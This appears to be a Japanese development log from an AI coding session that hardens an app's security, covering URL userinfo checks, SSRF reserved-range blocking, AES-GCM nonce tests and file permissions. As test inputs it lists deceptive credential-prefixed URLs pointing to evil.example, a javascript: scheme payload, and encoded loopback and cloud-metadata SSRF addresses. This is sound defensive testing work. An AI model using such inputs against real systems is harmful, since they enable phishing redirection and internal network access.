| `oauth.test.ts:804,812` (https 固定 / 秘密の直書き無し) | `OAUTH_CONFIGS` の件数は **`verify:arch` が「OAuth-supported service count = 10」として CI で留めている** |
| `oauth.test.ts:2135` (すべて https) | 直前の `it` が「PKCE ありが 6 件以上 (検査が空虚に通っていない)」を明示的に持つ |
| `bridgeContract.test.ts:111` (露出は関数だけ) | **次の検査が `Object.keys(exposed).sort()` を 13 名の完全一致で留める** |
| `teamradar.test.ts:1126` (points の形) | 次の検査が `.at(-1)!` で最後の polygon を取るので、0 件なら **TypeError で落ちる** |
| 残り 12 件 | 反復元がリテラルのデータカタログ (`TRIAGE_ROWS` / `HYDROPONIC_CROPS` / `DOC_LEGAL_STATUS` ほか)。空になれば同じファイルの他の検査が総崩れになる |

**いずれも「同じファイルの隣の検査」か「CI のゲート」が下限を持っていた。**
`redactionCoverage` が違ったのは、**下限が `>= 4` で実測が 6** ——
0 は止めるが**部分的な欠落は止めない**下限だったからである。
**下限を書くときは、それが「死んだこと」だけを見ているのか、
「痩せたこと」も見ているのかを区別する。**

### 対照が付いていたのは、いちばん危なくない関数だった — AES-GCM の nonce (2026-08-25)

暗号まわりでまだ読んでいない性質があった: **同じ鍵に同じ IV を二度使っていないか。**

AES-GCM で (鍵, IV) が重なると、2 つの平文の XOR が復元でき、さらに GHASH の
認証鍵が求まるので**任意の偽造**ができる。**鍵が違えば無害**なので、
危ないのは「1 つの鍵を使い回す」側である。

#### 実装は正しかった

`crypto.subtle.encrypt` を呼ぶのは 4 か所。IV はどれも
`crypto.getRandomValues(new Uint8Array(12))` で毎回作り直していた。**白。**

#### だが対照は 1 か所にしか無く、それは危なくない側だった

留めていたのは `dataCrypto.test.ts` の
「uses a fresh salt + iv per call (no deterministic ciphertext)」1 本だけで、
見ているのは `encryptString(plain, password)`。

**この関数は呼ぶたびに salt を作り直して鍵を derive する。**
かりに IV が定数になっても**鍵が毎回違う**ので、nonce 再利用の破局には至らない。

対照が無かったのは、鍵を使い回す 3 経路のほうだった:

| 関数 | 鍵の寿命 | 何を暗号化するか |
|---|---|---|
| `sealWithKey(key, text)` | **呼び出し側が使い回す** | 業務レコード (`recordCipher.ts`) / クラウドへ上げる本体 (`cloudProviderAdapter.ts`) / KCV |
| `vault.ts` の `encryptString` | **マスター鍵** | 全サービスの API トークン |
| `vault.ts` の `encryptBytes` | パスワード鍵 / リカバリー鍵 | マスター鍵そのもの |

**掃討はファイル単位、危険は関数単位** —— `dataCrypto.ts` は「済み」に見えていた。

#### 置いた対照 (`security/__tests__/aesGcmNonce.test.ts`)

1. **鍵を使い回す封緘**: 同じ鍵・同じ平文を **32 回**封緘して IV が 32 通りあること
   (暗号文も 32 通り)。IV が 12 バイトであること (切り詰めると衝突が早まる)。
2. **マスター鍵のトークン**: 同じトークン値を 2 度 `setToken` して、
   **IndexedDB に入った暗号文と IV が変わる**こと。復号して元の値に戻ることも
   見る —— 「壊れているから違う」を「別の IV だから違う」と読み違えないため。
3. **集合も留める**: `crypto.subtle.encrypt` を呼ぶ**どの関数も、同じ関数の中で
   `getRandomValues` から IV を採る**こと + 箇所が 4 つであること。
   **名指しの規則は、名指しした綴りしか止められない** —— 5 か所目に対して
   1 と 2 は何も言わない。

#### 対照 (3 通り壊して、全部鳴った)

| 壊し方 | 鳴った検査 |
|---|---|
| `sealWithKey` の IV を `new Uint8Array(12)` (全 0 定数) に | 封緘の一意性 + 集合の規則 |
| `vault.ts` の `encryptString` の IV を定数に | トークンの暗号文 + 集合の規則 |
| 外から IV を受け取る **5 か所目**を足す | 集合の規則 + 箇所数 |

どれも**2 本ずつ**鳴る (behavior と構造の両側から)。復元すると 6 件 green。

#### 直したわけではない — 留めただけである

**今日この経路に脆弱性は無い。** 見つけたのは「いちばん壊れると困る性質に、
対照が付いていなかった」ことである。定数 IV は 1 行の書き換えで入りうるし、
入っても**復号は通り、テストも全部緑のまま**だった。

### 本当の送り先を見せかけで隠す形が、外へ開く唯一の関門を通っていた (2026-08-25)

更新確認 (`app:checkUpdate`) を読んでいて、案内先の URL を検証する
`isGithubReleaseUrl` に敵対的な入力を 16 通り当てた。**15 通りは正しく落ちた** ——
`github.com.evil` / punycode / 部分ドメイン / 平文 http / `javascript:` は全部断る。
全角のピリオド `github。com` も URL 解析が本物へ畳むので**通してよい形**だった。

**通ってしまったのは 1 つ**: `https://user:pw@github.com/x`。

#### 数えたら、規則が 17 分の 3 にしか当たっていなかった

URL を `new URL()` で検証する関数を全部数えると **17 件**。
そのうち **userinfo (`user:pass@`) を落としているのは 3 件だけ**だった。

落としている 3 件 (`proxyEndpoint.ts` / `aiEndpoint.ts` / `ollama.ts`) は
どれも同じ理由を書いている ——
「`https://user:pass@evil.example` のように**本当の送り先を見せかけで隠す形**」。

**判断は既にリポジトリの中で下されていた。当てる先が足りていなかった。**

#### いちばん効くのは、外へ開く唯一の関門だった

`externalUrlGate.ts` の `externalUrlOrNull` は

- `setWindowOpenHandler` (窓が開こうとした URL)
- `ipcMain 'app:openExternal'` (画面が開いてくれと言った URL)

の**両方が通る 1 か所**で、**スキームしか見ていなかった。**

ここを通った文字列は画面のカードに出て、押されたら OS のブラウザへ渡る。
そして**ここへ来る URL には遠隔の応答から来たものがある** ——
`DataList.tsx:40` は `item.href` を押されたら開くが、その値は
ライブ取得した相手先の応答である。**名前を出せる立場の相手なら誰でも仕込める。**

`https://accounts.google.com@evil.example/` は頭から読むと信用できる名前で
始まるが、開くのは `evil.example` である。

#### 直した 2 か所

| 場所 | 変更 |
|---|---|
| `shared/externalUrlGate.ts` | `username`/`password` が空でなければ `null` |
| `shared/updateCheck.ts` | 同じ判定を `isGithubReleaseUrl` にも (案内先として画面に出す値なので) |

既存のテストは `github.com@evil.example` を既に持っていたが、それは
**hostname が evil.example なのでホスト固定で落ちていた**形である。
今回入れたのは**逆向き** —— hostname が**本物の github.com** で
認証情報だけが付いている形で、こちらは通っていた。

#### 過剰に落としていないことも留めた

`@` はパスにもクエリにも素片にも普通に出る。落とすのは**ホストの手前**だけ:

- `https://github.com/@handle` → 通す
- `https://example.com/?to=a@b.com` → 通す
- `https://example.com/#a@b` → 通す

**この 4 本が無いと、規則が過剰かどうかを誰も見ていないことになる。**

#### 対照

判定を外すと `externalUrlGate.test.ts` が **7 件**、
`updateCheck.test.ts` が **1 件**落ちる。戻すと 99 件 green。
実データ・雛形に userinfo 付き URL は **1 件も無い**ので、壊れる正当な経路は無い。

#### 自分の注記が、別のゲートに引っかかった

理由を書くとき本文へ `shell.openExternal` と綴ったら、`lint:forbidden` の
「主プロセス外での直接呼び出し」規則に当たった (**注記も走査対象である**)。
`app:openExternal` と書き換えた。前に踏んだ「注記が本文を引き写すと
`indexOf` の囮になる」の**裏返し** —— 注記に API 名を綴ると、
字面で探すゲートにとっては**呼び出しと区別がつかない**。

### 残り 14 の URL 関門を実際に呼んで確かめた + 窓の扉を関門へ縛った (2026-08-25)

前節で `externalUrlOrNull` / `isGithubReleaseUrl` に userinfo 判定を足したので、
**残りの関門はどうなのか**を数えた。前の走査は「関数本体を `export` で切って
`username` を grep する」形で、**取りこぼしがあった** (`atlassianSite` は
落としていると記録があるのに `✗` と出た)。**字面で数えるのをやめて、実際に呼んだ。**

#### `https://u:p@…` を各関門に通した結果

| 関門 | 結果 | 判定 |
|---|---|---|
| `proxyEndpoint.normalizeProxyEndpoint` | 弾く (`has-userinfo`) | 白 |
| `aiEndpoint.normalizeAiBaseUrl` | 弾く (`has-userinfo`) | 白 |
| `ollama.isAllowedOllamaBase` | 弾く | 白 |
| `externalUrlGate.externalUrlOrNull` | 弾く | **前節で直した** |
| `updateCheck.isGithubReleaseUrl` | 弾く | **前節で直した** |
| `ollama.parseOllamaEndpoint` | 通す → `http://127.0.0.1:11434` | **資格情報を落として返す。白** |
| `atlassianSite.normalizeAtlassianSiteResult` | 通す → `https://x.atlassian.net` | **同上。白** |
| `scanTarget.validateScanUrl` | 通す (そのまま) | **警告つきの設計。下記** |

**通した 3 つのうち 2 つは、資格情報を落として正規化していた** ——
「弾く」と同じ安全性で、しかも正当な入力を壊さない。字面の走査では
この違いが見えなかった。

#### `scanTarget` は「通して警告する」設計だった

`describeScanUrlRisk` が
「この URL には利用者名/パスワードが埋め込まれています。VirusTotal に送ると
そのまま第三者に見える形で残ります。」を返す。**利用者が自分で打った URL**を
外部スキャンにかける画面なので、断るのではなく知らせる判断である。

**警告が本当に画面へ出ているかを確かめた** ——
`SecurityPage.tsx:141` で計算し **339〜350 行で描画**している。
(このセッションで何度も踏んだ「計算しているが誰も出していない」ではなかった。)

#### ついでに見つけた —— 窓の扉が関門に縛られていなかった

`externalUrlGate.ts` の冒頭には、2026-08 に起きた事故が記録されている:
**許可表を締めても `setWindowOpenHandler` だけ古い手書き規則で開き続け、
検査は全部緑だった。** 実装は 1 つに統一されたが、
**「統一されている」ことを留める検査は無かった。**

`mainWindow.test.ts` の既存 3 本は「http(s) は通す / それ以外は通さない」を
**両方の実装が同じ答えを出す入力**でしか試していない。

対照で確かめた。窓の扉を `/^https?:\/\//i` の字面検査に戻すと:

```
Failed Tests 1     ← 今日足した突き合わせだけ
```

**既存 3 本は緑のまま。** 事故が再発しても誰も鳴らない状態だった。

#### 直し方 —— 標本の正解を手で書かない

「窓が OS へ回した物 == 関門が通した物」を突き合わせる。

```ts
const expected = probes.map((u) => externalUrlOrNull(u)).filter((v) => v !== null);
expect(openedExternal).toEqual(expected);
```

期待値を手で書かないので、**関門の規則が変わればこの検査も自動で追随し、
窓の扉だけが取り残されたときにだけ鳴る**。標本 15 種には、割れの原因だった
制御文字・逆スラッシュ・タブと、前節で足した userinfo、
巻き添えにしてはいけない `https://github.com/@handle` を入れた。
**空撃ちでないこと** (通る標本が 1 つ以上) と
**落とす側も測っていること** (落ちる標本が 1 つ以上) も同じ検査に置いた。

### 「自動では見つけられない」を、実際に検出器を書いて確かめた (2026-08-25)

`dualBuildDecisions.test.ts` は 2 実装の重複を 2 通りで見張っている:

- **同名の重複** —— `src/main` と `src/renderer` の export 名の積集合を
  **走査で作り**、台帳と双方向で突き合わせる (増えても減っても鳴る)。**本物の検出器。**
- **別名の重複** —— 手書きの一覧 1 件。注記が
  「**見つけたものを書き留める場所であって、検出器ではない**」と限界を明記している。

後者について、注記は「本文の類似度で拾う案は誤検知が多い」と書いている。
**別の手を 1 つ試した** —— 唯一の登録例 (`sanitizeMessages` / `sanitizeAssistantTurns`) は
**上限が字面で 2 度書いてあった**ことで見つかっている。ならば
**両側に現れる数値リテラル**が同じ種類の信号になるはずである。

#### 測った結果 —— 注記の判断が正しかった

| やり方 | 件数 | 中身 |
|---|---|---|
| 4 桁以上の数値が両側に現れる | **71 種** | ほぼ全部 `data/snapshot.ts` などの**見本データ** (金額・年・モック ID)。`main/clients/*.ts` の静的スタブは同じ形の値を返すので、当然一致する |
| 境界として使われている文脈だけ (`> N` / `.slice(…N)` / `Math.min(…,N)` / `timeout(N)` ほか) に絞る | **14 種** | 新しい組は **0 件** |

14 種の内訳は、**すでに台帳にあるもの** (`sma`/`ema`/`rsi`/`macd`/`bollingerBands` ——
`pure` に分類済み) か、**たまたま同じ丸い数** (100 / 200 / 1000 / 1024 が
別々の用途で使われている) だけだった。

**「誤検知が多いので採らない」は、実際に多かった。**

#### ついでに確かめた `*Web.ts` の対

名前で導ける対 (`main/clients/X.ts` ↔ `renderer/**/XWeb.ts`) は 2 組:

- `emotions` ↔ `emotionsWeb` → `emotionsLogMoodParity.test.ts` **在り**
- `ollama` ↔ `ollamaWeb` → **判定は両側とも `shared/ollama.ts` から import している**
  (「判定ロジックは main / renderer 共通に 1 つだけ置く」と注記に明記)。
  2 実装ではないので突き合わせる物が無い。**白。**

`main/clients/ollama.ts` だけが持つ `isAllowedEndpoint` は、
`shared` の `isAllowedOllamaBase` と**別の問い**である ——
前者は固定の loopback 上の**完全一致の許可表 3 本**、後者は
**利用者が入れた base URL** を受けてよいかの判定。別名の重複ではない。

#### 記録する理由

**「自動では見つけられない」と書いてあるだけだと、次に読む人は同じ案を
もう一度思いつく。** 何を試して何件出たかを残せば、同じ道を二度掘らずに済む。

### 掃討: 4 面を当たって全部白 (2026-08-25 実測)

新しい面を 4 つ当たった。**いずれも既に手当てされていた。**
次に読む人が同じ所を掘らないよう、何を見て何が守っているかだけ残す。

| 面 | 結果 | 守っているもの |
|---|---|---|
| プロトタイプ汚染 | 白 | `src/` に**データ由来のキーで書き込む形が 0 件** (`obj[k] = …`)。入口が無い |
| 秘密の比較 (時間差) | 白 | 平文の秘密を `===` で比べる箇所が無い。唯一効く OAuth state は `timingSafeEqual` (main) と同等実装 (ブラウザ) |
| CSV 数式注入 (CWE-1236) | 白 | `data/csv.ts` が `=` `+` `-` `@` タブ CR を `'` で打ち消し、**負数は数値として通す**。往復 (`unguardFormula`) も一致。**`csvExportGate.test.ts` が「新しい書き出しを関門へ通す強制」まで持っている** —— 出口 3 本 (`SalesPage` / `KpiPage` / `FinancialAnalysis`) が全部 `toCsv`/`recordsToCsv` 経由であることを実測 |
| ライブラリの保管 blob (蓄積型 XSS) | 白 | `library/preview.ts`。`blob:` の文書は**生成元と同一オリジン**になるので `window.open(blob:)` をやめ、画像は `<img src="data:">` (SVG は secure static mode でスクリプトが動かない)、`text/html` を含むテキストは `<pre>` のテキストノード。CSP は `frame-src 'none'` |

#### 見ておいてよかった点

- **`previewKind` は mime が正直であることに依存していない。** mime は
  「どの安全な入れ物に入れるか」を選ぶだけで、**入れ物はどちらも中身が
  何であっても安全**である (`<img>` は script を動かさない、`<pre>` は
  React がエスケープする)。嘘の mime で危険側へ倒れる経路が無い。
- **注記と実装が一致していた。** 「`data:` を使う (`blob:` は Electron 版の
  `img-src` に無い)」と書いてあり、実際に `blobToDataUrl` → `<img src={dataUrl}>`
  だった。このセッションで何度も踏んだ「書いてあることを実装がしていない」
  ではなかった。

#### 掘らなかった所とその理由

- **ダウンロード名の細工** —— `FinancialAnalysis` は
  `statement-${tab}-${unit.id}-${date}.csv` と組み立て、`unit.id` は
  利用者が作った事業単位の id である。だが**それを仕込めるのは
  既に手元のデータへ書ける者**なので、増える危険が無い。
  ブラウザは `download` 属性のパス区切りを落とす。

### SSRF の関門を敵対的な表記で当てた —— 42 通り中 39 通りは既に白 (2026-08-25)

ブラウザ版は CORS で塞がれる API を**利用者が用意した Cloudflare Worker**
経由で叩く。その行き先を決めるのが `isPrivateOrReservedTarget` である。
**読むのをやめて、実際に当てた。**

#### 既に塞がっていたもの (実測 39 通り)

10 進 (`2130706433`) / 16 進 (`0x7f000001`) / 8 進 (`0177.0.0.1`) / 短縮 (`127.1`) /
IPv6 loopback (`[::1]`) / IPv4-mapped (`[::ffff:127.0.0.1]` `[::ffff:7f00:1]`) /
NAT64 (`[64:ff9b::7f00:1]`) / cloud metadata (`169.254.169.254`,
`metadata.google.internal`, 末尾ドット付きも) / CGNAT (`100.64/10`) /
ベンチマーク (`198.18/15`) / ULA / link-local / 内部 TLD (`printer.local`,
単一ラベルの `internal`) / 先頭・末尾ドット —— **全部遮断していた。**

境界も正しい: `172.32.0.1` `100.128.0.1` `11.0.0.1` `example.localcom` は通す。

**この関門はよく出来ている。** 以下は穴というより**同じ意図の抜け**である。

#### 素通りしていた 5 つ + 1 つ

この関数の名は `isPrivateOrReservedTarget` で、既に **「私的」ではない予約**
(CGNAT・ベンチマーク用) を遮断している。同じ理由が掛かっていなかった範囲:

| 範囲 | 何か |
|---|---|
| `192.0.0.0/24` | IETF プロトコル割当 (RFC 6890)。**DS-Lite の 192.0.0.0/29 を含み、CPE 上で実際に応答することがある** |
| `192.0.2.0/24` | 文書用 TEST-NET-1 (RFC 5737) |
| `198.51.100.0/24` | 文書用 TEST-NET-2 |
| `203.0.113.0/24` | 文書用 TEST-NET-3 |
| `192.88.99.0/24` | 6to4 リレー anycast (RFC 3068 / 廃止 RFC 7526) |
| `2001:db8::/32` | 文書用 IPv6 (RFC 3849) |

どれも公開経路には出ない。だから**要求が届くとすれば、その番号を内部で
流用している網の中だけ**である —— 利用者の Worker を経由して外から
触らせる先ではない。

#### 以前の判断を 1 つ変えた (埋めずに書く)

`proxy.test.ts` には

```ts
expect(pri('http://[2001:db8::1]/')).toBe(false); // public documentation range
```

が**明示的に**在った。つまり前は「通す」と決めていた。だが注記の
**「public」が事実に反する** —— RFC 3849 の文書用は公開経路へ出さない番号である。
そして同じ関数が CGNAT とベンチマーク用を遮断しており、
「公開に出ないから何も居ない」という性質はまったく同じである。
**同じ理由の範囲を、片方だけ通していた。**

遮断して失う正当な行き先は無いので `true` へ変えた。
**前の決定を上書きしたことは、注記に残した。**

#### 重大度は低い —— 誇張しない

これらは公開経路に出ないので、**今日この経路で外から届く先は増えていない**。
直したのは「関門の名前が約束している範囲」と実装のずれである。
本命の守りは別にあり、`docs/PROXY_EXAMPLE.md` §3 の
**Worker 側で DNS 解決後の IP を見る検査**がそれである
(この関数は名前しか見られないので、DNS リバインディングは原理的に防げない)。

#### 対照 (3 通り、それぞれ違う検査が鳴る)

| 壊し方 | 鳴った検査 |
|---|---|
| 新しい v4 規則を 5 本とも外す | 「予約範囲も遮断する」 |
| `a === 192 && b === 0` と**広げる** (192.0.x.x を全部塞ぐ) | 「隣接する公開範囲は通す」 |
| IPv6 側を `^2001:` と**広げる** (Google DNS まで塞ぐ) | 「IPv6 loopback / ULA …」の公開側 |

**広げすぎる側の対照を 2 本置いたのが要点である。** 遮断規則は
「足りない」だけでなく「効きすぎる」でも壊れる —— 隣の /24 を巻き込めば
正当な行き先が黙って届かなくなり、しかも**画面には何も出ない**。

### 締めるのは書いた後である —— 固定名の `.tmp` が権限を運んでいた (2026-08-25)

保管ファイルの権限を当たり直した。**5 つのうち 3 つは既に閉じており、
2 つが開いていた。**

#### 閉じていた側 (実測)

| 書き手 | 方式 | 実測 |
|---|---|---|
| `secrets.ts` (トークン) | `atomicWriteFile` | 新規 600 / 既存 644 → **600 に直る** / 控えも 600 |
| `emotions.ts` | `atomicWriteFile` | 同上 |
| `exportPaths.ts` | `writeFile` + **明示 chmod** + 起動時の均し | 同上 |

`atomicWriteFile` の一時ファイル名は `${target}.tmp-${pid}-${Date.now()}-${乱数}`
で**毎回一意**なので、古い一時ファイルの権限を引き継ぐ形にならない。
既定 mode も 0600 で、指定を落としても緩まない。

#### 開いていた側 —— `stocks.ts` と `teamradar.ts`

この 2 つは `atomicWriteFile` を使わず、**固定名**の `p + '.tmp'` へ書いて
`rename` で被せていた。`fs.writeFile(..., { mode })` は
**新規作成のときしか効かない**ので:

```
  事前の .tmp = 644 → 保存後の本体 = 644     ← 穴
  .tmp 無し          → 保存後の本体 = 600
  本体 644・.tmp 無し → 保存後の本体 = 600   (rename が本体の権限を捨てる)
```

古い版 (権限を付ける前) が書き込み途中で落ちると、まさにこの `.tmp` が残る。
**`teamradar` が持つのは同僚の評価**である。

#### 注記が主張していたことが、実測と食い違っていた

`teamradar.ts` にはこう書いてあった:

> 置き換わる実体は毎回 0600 で作られたものになる (実測で確認)

**本体の権限については正しいが、`.tmp` が既に在る場合を見ていない。**
「実測で確認」と書いてある主張が、別の初期条件で崩れていた。訂正した。

#### 直し方 —— `Stryker disable` の外へ出す

書いた後に `chmod` する。ただし**既定の実装の中**に置く ——
検査が差し替える `deps.writeFile` は実ファイルを作らないので、
外に出すと注入側が `chmod` の ENOENT で落ちる。

最初は `writeFn` の中へ直接書いたが、そこは
`Stryker disable ArrowFunction,BooleanLiteral` の**内側**だった ——
`lint:mutation-scope` が「広い無効化が 30 → 50 行に増えた」と鳴った
(**このファイル自身の注記が「この注記は disable の外に置くこと」と
書いている**のに、同じ間違いをした)。

`writeTight()` という名前付き関数へ括り出して**無効化の外**へ置いた。結果:

```
  広い無効化: 2 ファイル / 2 箇所 / 170 行  →  1 ファイル / 1 箇所 / 139 行
```

**chmod が測られる側へ移り、黙っている範囲も減った。**

#### 対照

`chmod` を 2 つとも外すと、新しい検査 `staleTmpMode.test.ts` の
**「古い .tmp があっても本体は 0600」だけが 2 件落ちる**。
そのとき **`stocks` / `teamradar` の既存 420 件は全部緑のまま**だった ——
**既存の検査からは見えない穴だった。**

### 4 度目を待たずに、規則へ変えた —— 書き込み権限のゲート (2026-08-25)

前節で `stocks` / `teamradar` の穴を塞いだが、**塞いだのは 2 か所であって、
形ではなかった。** 同じ形をこのリポジトリは **3 度**踏んでいる:

| いつ | どこ | 何が起きたか |
|---|---|---|
| 2026-08-13 | `emotions.ts` | `{ mode: 0o600 }` を足したが、**既存 644 は直らない** |
| 2026-08-25 | `exportPaths.ts` | 状態は 600 なのに**書き出しが 644** |
| 2026-08-25 | `stocks.ts` / `teamradar.ts` | **固定名の `.tmp` が 644 だと、それが本体へ被さる** |

3 度目のとき、既存 420 件は全部緑だった。**書く場所ごとに人が気を付ける形では、
4 度目が来る。**

#### 規則にできる条件が揃っていた

`src/main` で実際にファイルを書く呼び出しは **4 か所しかない**。
受理すべき対象が並ぶ形ではないので、**精度の高いゲートが作れる**
(このリポジトリは「300 件を受理し続けるゲートは作らない」と決めている)。

規則: **`fs.writeFile` 等のあとに、同じ引数への `chmod(…, 0o600)` が続くこと。**
例外は `atomicWrite.ts` のみで、理由を台帳に書いた ——
書き先が `${target}.tmp-${pid}-${Date.now()}-${乱数}` で**毎回一意な新規ファイル**
なので `fs.open(tmp, 'w', mode)` の mode が必ず効き、既存の権限を継ぐ経路が無い。

#### 実物に当てた対照 —— 今日直した穴を、そのまま再現する

| 壊し方 | ゲートの出力 |
|---|---|
| `stocks` / `teamradar` の chmod を外す | `clients/stocks.ts: fs.writeFile(target, …)` / `clients/teamradar.ts: …` |
| `exportPaths` の chmod を外す (今日より前の穴) | `clients/exportPaths.ts: fs.writeFile(filePath, …)` |

**過去 2 回の事故を、どちらも呼び出し位置つきで名指しした。**

#### 空虚に通らないための作り

- 判定は純関数 (`findUnclosedWrites`) —— **実ファイルを触らずに壊せる**
- 合成ケースで両側を留めた: 閉じていない → 鳴る / 閉じてある → 鳴らない /
  **別の引数を締めても鳴る** (取り違えを許さない) / **注記の字面は数えない** /
  例外台帳が効く
- 走査が死んでいないこと (`clients/exportPaths.ts` を読めている) を別に確認
- 例外台帳は**実在チェックと理由の長さ**つき —— 消えたファイルの例外が残らない

### CI が既定で回さない 5 つを、この HEAD で全部回した (2026-08-25 / `694b8956`)

**理由**: 今日の変更のうち 2 つは**レンダラー**に入っている ——
`externalUrlGate.ts` (認証情報つき URL の遮断) と `proxy.ts` (SSRF の予約範囲)。
前者は**ブラウザ版の `openExternal` が同じ関数を呼ぶ**ので、単体検査だけでは
実ブラウザでの挙動を確かめたことにならない。`CLAUDE.md` も
「レンダラーや起動性能を触ったら出荷前にローカルで回すこと」と書いている。

| | 結果 |
|---|---|
| `e2e` (実 chromium・desktop/phone/tablet・14 節) | ✅ ALL PASSED |
| `e2e:lite` | ✅ ALL PASSED |
| `perf` | ✅ LITE 2.75MB **DCL 165ms** / FULL 10.86MB **DCL 482ms** (上限 1200 / 2500)・起動時の巨大 `JSON.parse` 0 |
| `smoke` (Electron・**72 面**) | ✅ console エラー **0 件** |
| `e2e:ollama` (7 状態) | ✅ ALL PASSED |

`e2e` の第三者送信の節は、今日直した所を**実機で**通っている ——
「プロキシの運用者からも見えると書いている (実際 2 箇所)」
「プロキシ: 自分の Worker だけを入れるよう言っている」
「プロキシ: 何が渡るのか (トークン) を名指ししている」。

#### 手順の罠 (次に回す人へ)

`build:web:lite` は**内部で `build:web` を呼び、`dist/` を空にする**。
素直に `build:web` → `build:web:lite` と続けると**フル版が消えて `perf` が
落ちる** (実際に踏んだ)。順序は:

```bash
npm run build:web        # dist/standalone.html
cp dist/standalone.html /tmp/full.html
npm run build:web:lite   # dist/ を空にして standalone-lite.html を作る
cp /tmp/full.html dist/  # フル版を戻す
npm run perf
```

`perf` のエラー文はこの順序を正しく案内している。

### 数を読む前に 1 つ手で当てる —— 自分で同じ罠を踏み直した (2026-08-25)

今日足した検査が**本当に測っているか**を、変異検査で確かめようとした。
触った 6 ファイルは全部 `mutate` の 244 件に載っている。

#### 得られた本物の結果

| ファイル | 結果 |
|---|---|
| `shared/externalUrlGate.ts` | **100.00%** (22 killed / 生存 0) —— 今日足した userinfo 遮断は全部殺されている |
| `shared/updateCheck.ts` | **100.00%** (145 killed / 生存 0) |

**これが確かめたかったこと。** 認証情報つき URL の規則は、変異させれば必ず落ちる。

#### そして、既に 2 度記録されている罠を踏んだ

同じ実行で `scanTarget.ts` が **80.28% / 生存 43** と出た。触っていないファイルである。

やったこと 2 つが、どちらも間違いだった:

1. **`--mutate` で対象を絞った。** リポジトリの記録
   (`REMAINING_WORK.md:6209` / `SESSION_HANDOFF.md`) は
   「**絞った `--mutate` は perTest の帰属がずれる**」と書いており、
   同じ `scanTarget.ts` が **79.17% / 生存 20** と出た事例まで残っている。
2. **incremental キャッシュを引き継いだ。** 1 回目の実行が
   `.stryker-incremental.json` を書き、2 回目がそれを読んだ ——
   だから 2 回目のほうが**対象が増えた**。`mutation.yml` は
   「差分測定では incremental キャッシュを使わない。古い結果が残ると
   survived が誤って残る (2026-08 の監査で `atlassian.ts` が『生存 1』と誤報された)」
   と**まさにこの理由で**書いてある。

#### リポジトリの作法どおり、1 つ手で当てた

報告された生存 (`SECRET_PARAM_NAMES` の `'token'` → `''`) を**実際に当てて**
テストを回すと:

```
× 同じ名前を重ねて挙げない
× token を資格情報として拾う
× token は大文字小文字を問わず拾う
× 一覧に載っている名前をすべて検査している
× 資格情報と社内ホストが両方当たるなら、資格情報のほうを出す
→ 5 件が落ちる
```

**偽の生存である。** しかも落ちた 5 件は、前回の監査が記録した 5 件と**同じ**。
`scanTarget.ts` の生存はモジュール直下の初期化式 (**静的変異体**) で、
import 時に評価されるためテストからは殺せない —— これも既に測って記録されている
(だからこのリポジトリは**ファイル単位の変異スコア下限ゲートを作らない**と決めている。
点数が静的変異体で汚れるので、下限を引くと本物でない赤を出し続ける)。

#### 何を学んだか

**記録を読む前に測り、測った数を読む前に 1 つ手で当てる、の順序を守らなかった。**
先に `REMAINING_WORK.md` を検索していれば 1 分で済んだし、
先に手で 1 つ当てていても 1 分で済んだ。**どちらもやらずに数だけ読んだ。**

次に変異検査を使う人へ:

```bash
rm -f .stryker-incremental.json        # 古い結果は survived を誤って残す
npx stryker run                        # 絞らない (絞ると perTest の帰属がずれる)
# 生存が出たら、まず 1 つ手で当てて、テストが落ちるか見る
```

### 出典の「運び方」を、初めてゲートが見るようにした (2026-08-25)

`REMAINING_WORK.md:3383` に**まだ閉じていない**指摘が残っていた ——

> `lint:citations` は出典の内部矛盾を、`lint:doi-prefix` は出版社のずれを
> 見ているが、**スキームは 3 つのゲートのどれも見ていない**

実測し直すと、指摘のとおり今も開いていた:

```
  https  12,215 件
  http       22 件      ← 台帳も検査も無い
  それ以外    0 件
```

#### なぜ効くのか

このアプリは出典を**「確証済み」として提示する**。だがその主張のうち
**運搬の完全性だけが誰にも見られていなかった** —— 平文で配られる出典は
経路上で書き換えられる。読むだけの公開ページなので影響は限定的で、
**コードの脆弱性ではなくデータの完全性**の話である。

#### 22 件を今この場で https へ書き換えなかった理由

このリポジトリの決まりは **「推測で出典を直さない」**。
`http://` を `https://` に替えて 200 が返っても、**同じ文書が出ている保証には
ならない** (別物・リダイレクト先・404 ページ)。一次資料に当たるまでは
**素性の分かっている 22 件**として台帳へ置いた。台帳は双方向なので、
**直したら外すことが強制される。**

#### 足した規則 3 つ

1. `http:` / `https:` **以外**のスキームは例外なく落とす
2. 台帳に無い**新しい平文 http** は落とす
3. 台帳にあるのに出典から消えた URL も落とす (古い台帳を残さない)

#### 実データに当てた対照

| 壊し方 | 出力 |
|---|---|
| 台帳に無い平文 http を足す | `eh-1968: 台帳に無い平文 http — http://new-plaintext.example/paper.pdf` |
| `javascript:` を足す | `eh-1968: http(s) 以外のスキーム — javascript:alert(1)` |
| 台帳に古い項目を残す | `台帳にあるが出典に無い — … (直したなら台帳から外すこと)` |

**どれも entry id と URL を名指しする。**

#### ついでに閉じた 2 つ

- **このゲートには `--self-test` が無かった** (`lint:doi-prefix` も同じ)。
  合成 11 ケースを足して `lint:citations` の中で回すようにした。
  `verify:arch` の指標「陰性対照つきゲート」が **26 → 27** に動いた
  —— **数が動いたこと自体が、対照が本当に増えた証拠**である。
- **`main()` が無条件に走っていた。** `require` しただけでゲートが実行され、
  失敗すれば `process.exit(1)` で self-test に到達すらできない。
  `require.main === module` で囲んだ。

#### 残っているもの

**22 件の http 出典を https へ上げる作業**は、一次資料で
「同じ文書が https で出ている」ことを 1 件ずつ確かめてから行う。
台帳がその作業一覧になっている (`scripts/lint-citations.cjs` の
`PLAINTEXT_ALLOWLIST`)。

**確かめ方は推測を要らなくする形で書いた** —— 両方を取って
**バイト列を突き合わせ**、一致すれば同じ文書と判断する
(手順は `lint-citations.cjs` の台帳の注記にシェルで置いた)。
ハッシュが違うときは上げない —— PDF は配信側で再生成されることがあり、
中身が同じでもバイトが変わるので、そのときは本文を読んで判断する。

**このセッションでは実行できなかった。** 実行環境のネットワーク方針が
任意の外部ホストへの CONNECT を 403 で拒む (実測: `piketty.pse.ens.fr` へ
http=403 / https=接続不可)。**方針は迂回しない。** 通信できる環境で回すこと。

### 鍵の送り先が留められていたのは 3 経路のうち 1 つだけ (2026-08-25)

記録 (`REMAINING_WORK.md:2321` 付近) が「`callAssistantChat` / `callEmotionsAnalyze`
は**送り先はまだ**」と書いていたので、実測しに行った。

#### 実測 —— 鍵をそのまま別ホストへ出す変更が、全テストを通った

ブラウザ版が `x-api-key` を載せて Anthropic を**直接**叩く経路は 3 つある:

| 経路 | 送り先が留められていたか |
|---|---|
